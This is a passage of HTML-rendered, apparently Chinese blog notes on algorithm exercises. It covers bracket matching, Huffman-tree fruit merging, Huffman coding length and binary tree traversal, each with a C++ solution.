class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="括号匹配问题">括号匹配问题</h3><h5 id="题目描述-11">题目描述</h5><p>在某个字符串（长度不超过100）中有左括号、右括号和大小写字母；规定（与常见的算数式子一样）任何一个左括号都从内到外与在它右边且距离最近的右括号匹配。写一个程序，找到无法匹配的左括号和右括号，输出原来字符串，并在下一行标出不能匹配的括号。不能匹配的左括号用"$"标注,不能匹配的右括号用"?"标注。</p><h5 id="输入输出格式-9">输入输出格式</h5><h6 id="输入描述-11">输入描述:</h6><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入包括多组数据，每组数据一行，包含一个字符串，只包含左右括号和大小写字母，字符串长度不超过<span class="number">100</span>。</span><br><span class="line">注意：cin.getline(<span class="built_in">str</span>,<span class="number">100</span>)最多只能输入<span class="number">99</span>个字符！</span><br></pre></td></tr></table></figure><h6 id="输出描述-11">输出描述:</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对每组输出数据，输出两行，第一行包含原始输入字符，第二行由<span class="string">&quot;<span class="variable">$</span>&quot;</span>,<span class="string">&quot;?&quot;</span>和空格组成，<span class="string">&quot;<span class="variable">$</span>&quot;</span>和<span class="string">&quot;?&quot;</span>表示与之对应的左括号和右括号不能匹配。</span><br></pre></td></tr></table></figure><p>先正序，再倒序入栈</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string s;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; s)&#123;</span><br><span class="line"><span class="type">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line"><span class="type">int</span> tag[len] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">stack&lt;<span class="type">char</span>&gt; st;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i] == <span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">st.<span class="built_in">push</span>(s[i]);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(s[i] == <span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">tag[i] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">st.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (!st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        st.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; s&lt;&lt; endl;</span><br><span class="line"><span class="built_in">reverse</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>());</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i] == <span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">st.<span class="built_in">push</span>(s[i]);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(s[i] == <span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">tag[len - <span class="number">1</span> - i] = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">st.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(tag[i] == <span class="number">0</span>)&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(tag[i] == <span class="number">1</span>)&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;$&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="哈夫曼树">哈夫曼树</h2><h3 id="合并果子">合并果子</h3><h5 id="题目描述-12">题目描述</h5><p>在一个果园里，多多已经将所有的果子打了下来，而且按果子的不同种类分成了不同的堆。多多决定把所有的果子合成一堆。每一次合并，多多可以把两堆果子合并到一起，消耗的体力等于两堆果子的重量之和。可以看出，所有的果子经过n-1次合并之后，就只剩下一堆了。多多在合并果子时总共消耗的体力等于每次合并所耗体力之和。因为还要花大力气把这些果子搬回家，所以多多在合并果子时要尽可能地节省体力。假定每个果子重量都为1，并且已知果子的种类数和每种果子的数目，你的任务是设计出合并的次序方案，使多多耗费的体力最少，并输出这个最小的体力耗费值。例如有3种果子，数目依次为1，2，9。可以先将1、2堆合并，新堆数目为3，耗费体力为3。接着，将新堆与原先的第三堆合并，又得到新的堆，数目为12，耗费体力为12。所以多多总共耗费体力=3+12=15。可以证明15为最小的体力耗费值。</p><h5 id="输入输出格式-10">输入输出格式</h5><h6 id="输入描述-12">输入描述:</h6><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入包括两行，第一行是一个整数<span class="built_in">n</span>(<span class="number">1</span>&lt;＝n&lt;=<span class="number">10000</span>)，表示果子的种类数。第二行包含n个整数，用空格分隔，第<span class="selector-tag">i</span>个整数<span class="built_in">ai</span>(<span class="number">1</span>&lt;＝ai&lt;=<span class="number">20000</span>)是第<span class="selector-tag">i</span>种果子的数目。</span><br></pre></td></tr></table></figure><h6 id="输出描述-12">输出描述:</h6><figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">输出包括一行，这一行只包含一个整数，也就是最小的体力耗费值。输入数据保证这个值小于</span><span class="number">2</span><span class="keyword">^31</span><span class="language-xml">。</span></span><br></pre></td></tr></table></figure><p>题目很容易看出贪心策略：每次只合并最小的两堆</p><p>但是每次合并后的堆还要放回去，得保证放回去后数据依旧有序</p><p>这里介绍一种数据结构：优先队列，头文件#include<code>&lt;queue&gt;</code></p><p>这个队列弹出元素不是按照入队的先后，而是按照权值的大小出队。</p><p>定义：</p><p>priority_queue <code>&lt;int&gt;</code> q;定义队列q，权值大的先出队</p><p>priority_queue &lt;int, vector <code>&lt;int&gt;</code>, greater<code>&lt;int&gt;</code> &gt; q;权值小的先出队</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line">priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt; &gt; q;</span><br><span class="line"><span class="type">int</span> a, ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; a;</span><br><span class="line">q.<span class="built_in">push</span>(a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(q.<span class="built_in">size</span>() &gt; <span class="number">1</span>)&#123;</span><br><span class="line"><span class="type">int</span> t1 = q.<span class="built_in">top</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line"><span class="type">int</span> t2 = q.<span class="built_in">top</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line"><span class="type">int</span> t = t1 + t2;</span><br><span class="line">q.<span class="built_in">push</span>(t);</span><br><span class="line">ans += t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; ans;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实还有一种写法，自己定义节点和操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> &#123;</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="comment">// 定义优先队列的比较关系，这里我们定义的是小根堆 </span></span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span> &lt; (<span class="type">const</span> node&amp; a) <span class="type">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x &gt; a.x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> n, x;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n) != EOF) &#123;</span><br><span class="line">priority_queue&lt;node&gt; q;</span><br><span class="line"><span class="keyword">while</span> (n--) &#123;</span><br><span class="line">cin &gt;&gt; x;</span><br><span class="line">q.<span class="built_in">push</span>(node&#123;x&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (q.<span class="built_in">size</span>() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">node num1 = q.<span class="built_in">top</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line">node num2 = q.<span class="built_in">top</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line">ans += num1.x + num2.x;</span><br><span class="line">q.<span class="built_in">push</span>(node&#123;num1.x + num2.x&#125;);</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="哈夫曼编码">哈夫曼编码</h3><h5 id="题目描述-13">题目描述</h5><p>熵编码器是一种数据编码方法，它通过对删除了“浪费”或“多余”信息的消息进行编码来实现无损数据压缩。换句话说，熵编码首先删除了对消息进行精确编码所不需要的信息。高度的熵意味着一条带有大量浪费信息的消息。以ASCII编码的英文文本是具有非常高的熵的消息类型的示例。已经压缩的消息（例如JPEG图形或ZIP归档文件）的熵很小，因此无法从进一步的熵编码尝试中受益。</p><p>用ASCII编码的英文文本具有很高的熵，因为所有字符都使用相同的位数（八位）进行编码。众所周知的事实是，与英语文本中大多数其他字母相比，字母E，L，N，R，S和T的出现频率要高得多。如果可以找到一种仅用4位对这些字母进行编码的方法，则新的编码将更小，包含所有原始信息并且熵更少。ASCII会使用固定位数，这是有原因的：这很容易，因为一个人总是处理固定位数来表示每个可能的字形或字符。对于上述字母使用四位的编码方案如何区分四位代码和八位代码？使用所谓的“无前缀可变长度”编码可以解决这个看似困难的问题。</p><p>在这种编码中，可以使用任意数量的位来表示任何字形，并且消息中不存在的字形也不会被简单地编码。但是，为了能够恢复信息，不允许将编码字形的位模式作为任何其他编码位模式的前缀。这允许对编码的比特流进行逐位读取，并且只要遇到代表字形的一组位，就可以对该字形进行解码。如果没有实施无前缀约束，那么这样的解码将是不可能的。</p><p>考虑文字“AAAAABCD”。使用ASCII，对此进行编码将需要64位。相反，如果我们用位模式“00”编码“ A”，用“ 01”编码“ B”，用“ 10”编码“ C”，用“ 11”编码“D”，那么我们只能用16位编码该文本。位;结果位模式将为“0000000000011011”。但是，这仍然是固定长度的编码。每个字形使用的是两位，而不是八位。由于字形“A”以更高的频率出现，我们可以通过用更少的比特对其进行编码来做得更好吗？实际上我们可以，但是为了保持无前缀编码，其他一些位模式将变得比两位长。最佳编码是用“0”编码“ A”，用“ 10”编码“ B”，用“ 110”编码“ C”，用“ 111”编码“ D”。（这显然不是唯一的最佳编码，因为很明显，对于B，C和D的编码可以在不增加最终编码消息大小的情况下自由地互换用于任何给定的编码。）使用这种编码，消息可以在“0000010110111”只有13位，压缩比为4.9：1（也就是说，最终编码消息中的每个位代表的信息与原始编码中4.9位的信息一样多）。从左到右通读此位模式，您会发现，即使代码的位长不同，无前缀编码也可以很容易地将其解码为原始文本。</p><p>作为第二个示例，请考虑文字“帽子里的猫”。在本文中，字母“T”和空格字符均以最高频率出现，因此在最佳编码中，它们显然具有最短的编码位模式。字母“C”，“ I”和“ N”仅出现一次，因此它们的编码最长。</p><p>有许多可能的无前缀可变长度位模式集，它们可以产生最佳编码，也就是说，允许文本以最少的位数进行编码。一种这样的最佳编码是使用“00”，“ A”和“ 100”，“ C”和“ 1110”，“ E”和“ 1111”，“ H”和“ 110”，“ I”和“1010”，“ N”和“ 1011”以及“ T”和“01”。因此，最佳编码仅需要51位，而使用144位消息以8位ASCII编码（压缩率为2.8到1）进行编码时则需要144位。</p><h5 id="输入输出格式-11">输入输出格式</h5><h6 id="输入描述-13">输入描述:</h6><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入文件将包含文本字符串列表，每行一个。 文本字符串将仅包含大写字母数字字符和下划线（用于代替空格）。 输入结束将通过仅包含单词“ <span class="keyword">END</span>”作为文本字符串的行来表示。 此行不应被处理。</span><br></pre></td></tr></table></figure><h6 id="输出描述-13">输出描述:</h6><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对于输入中的每个文本字符串，输出<span class="number">8</span>位<span class="keyword">ASCII</span>编码的位长度，最佳无前缀可变长度编码的位长度以及精确到小数点后的压缩率。</span><br></pre></td></tr></table></figure><p>只求哈夫曼编码的长度可以规约到以字符的数量大小为叶节点的哈夫曼树上。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string s;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; s)&#123;</span><br><span class="line"><span class="keyword">if</span>(s == <span class="string">&quot;END&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; m;</span><br><span class="line"><span class="type">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">m[s[i]]++;</span><br><span class="line">&#125;</span><br><span class="line">map&lt;<span class="type">char</span>, <span class="type">int</span>&gt;::iterator iterm;</span><br><span class="line">priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt; &gt; q;</span><br><span class="line"><span class="keyword">for</span>(iterm = m.<span class="built_in">begin</span>(); iterm != m.<span class="built_in">end</span>(); iterm++)&#123;</span><br><span class="line">q.<span class="built_in">push</span>(iterm-&gt;second);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(q.<span class="built_in">size</span>() == <span class="number">1</span>)&#123;</span><br><span class="line">ans = q.<span class="built_in">top</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(q.<span class="built_in">size</span>() &gt; <span class="number">1</span>)&#123;</span><br><span class="line"><span class="type">int</span> t1 = q.<span class="built_in">top</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line"><span class="type">int</span> t2 = q.<span class="built_in">top</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line"><span class="type">int</span> t3 = t1 + t2;</span><br><span class="line">ans += t3;</span><br><span class="line">q.<span class="built_in">push</span>(t3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> l = len * <span class="number">8</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d %.1f\n&quot;</span>, l, ans, (<span class="type">double</span>)l / ans);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二叉树">二叉树</h2><p>一些概念：二叉树定义、特点、性质：</p><p><img src="/.io//算法刷题记录/1687596261551.png" alt="1687596261551"></p><p><img src="/.io//算法刷题记录/1687596272848.png" alt="1687596272848"></p><p><img src="/.io//算法刷题记录/1687596299111.png" alt="1687596299111"><img src="/.io//算法刷题记录/1687596289196.png" alt="1687596289196"></p><p>其他的概念比如满二叉树、完全二叉树，二叉树遍历（前中后序）</p><h3 id="二叉树的建立和遍历">二叉树的建立和遍历</h3><h5 id="题目描述-14">题目描述</h5><p>建立以二叉链作为存储结构的二叉树，实现 1）先序遍历； 2）中序遍历；3）后序遍历； 4）层序遍历； 5）编程计算二叉树的叶子结点个数。</p><h5 id="输入输出格式-12">输入输出格式</h5><h6 id="输入描述-14">输入描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">按照先序遍历序列输入二叉树中数据元素的值，没有的输入0表示。</span><br></pre></td></tr></table></figure><h6 id="输出描述-14">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一行输出先序遍历序列 第二行输出中序遍历序列 第三行输出后序遍历序列 第四行输出叶子结点的个数。</span><br></pre></td></tr></table></figure><p>注意函数传参</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> max(a, b) a &gt; b ? a : b;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line"><span class="type">char</span> c;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *l, *r;</span><br><span class="line">&#125;*Tree;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">createTree</span><span class="params">(Tree &amp;T)</span></span>&#123;</span><br><span class="line"><span class="type">char</span> c;</span><br><span class="line">cin &gt;&gt; c;</span><br><span class="line"><span class="keyword">if</span>(c == <span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">T = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">T = (<span class="keyword">struct</span> node *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(node));</span><br><span class="line">T-&gt;c = c;</span><br><span class="line"><span class="built_in">createTree</span>(T-&gt;l);</span><br><span class="line"><span class="built_in">createTree</span>(T-&gt;r); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PreOrderTraverse</span><span class="params">(Tree T)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T != <span class="literal">NULL</span>)&#123;</span><br><span class="line">cout &lt;&lt; T-&gt;c &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="built_in">PreOrderTraverse</span>(T-&gt;l);</span><br><span class="line"><span class="built_in">PreOrderTraverse</span>(T-&gt;r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InOrderTraverse</span><span class="params">(Tree T)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T != <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">InOrderTraverse</span>(T-&gt;l);</span><br><span class="line">cout &lt;&lt; T-&gt;c &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="built_in">InOrderTraverse</span>(T-&gt;r);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PostOrderTraverse</span><span class="params">(Tree T)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T != <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">PostOrderTraverse</span>(T-&gt;l);</span><br><span class="line"><span class="built_in">PostOrderTraverse</span>(T-&gt;r);</span><br><span class="line">cout &lt;&lt; T-&gt;c &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Leaf</span><span class="params">(Tree T)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(T-&gt;l == <span class="literal">NULL</span> &amp;&amp; T-&gt;r == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">Leaf</span>(T-&gt;l) + <span class="built_in">Leaf</span>(T-&gt;r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Depth</span><span class="params">(Tree T)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> x = <span class="built_in">Depth</span>(T-&gt;l);</span><br><span class="line"><span class="type">int</span> y = <span class="built_in">Depth</span>(T-&gt;r);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">max</span>(x, y) + <span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Tree root;</span><br><span class="line"><span class="built_in">createTree</span>(root);</span><br><span class="line"><span class="built_in">PreOrderTraverse</span>(root);</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"><span class="built_in">InOrderTraverse</span>(root);</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"><span class="built_in">PostOrderTraverse</span>(root);</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="built_in">Leaf</span>(root) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span 